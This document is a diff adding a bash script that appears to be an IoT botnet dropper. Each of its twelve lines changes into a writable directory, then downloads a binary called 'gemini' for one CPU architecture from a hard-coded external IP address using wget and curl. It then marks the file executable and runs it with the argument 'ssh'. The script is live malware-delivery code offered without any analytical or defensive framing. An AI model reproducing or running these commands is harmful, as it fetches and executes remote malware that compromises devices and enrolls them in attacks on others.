@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.x86; curl -O http://185.244.25.176/bins/gemini.x86;cat gemini.x86 >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.mips; curl -O http://185.244.25.176/bins/gemini.mips;cat gemini.mips >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.mpsl; curl -O http://185.244.25.176/bins/gemini.mpsl;cat gemini.mpsl >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.arm4; curl -O http://185.244.25.176/bins/gemini.arm4;cat gemini.arm4 >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.arm5; curl -O http://185.244.25.176/bins/gemini.arm5;cat gemini.arm5 >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.arm6; curl -O http://185.244.25.176/bins/gemini.arm6;cat gemini.arm6 >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.arm7; curl -O http://185.244.25.176/bins/gemini.arm7;cat gemini.arm7 >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.ppc; curl -O http://185.244.25.176/bins/gemini.ppc;cat gemini.ppc >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.m68k; curl -O http://185.244.25.176/bins/gemini.m68k;cat gemini.m68k >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.arc; curl -O http://185.244.25.176/bins/gemini.arc;cat gemini.arc >gemini;chmod +x *;./gemini ssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.176/bins/gemini.sh4; curl -O http://185.244.25.176/bins/gemini.sh4;cat gemini.sh4 >gemini;chmod +x *;./gemini ssh
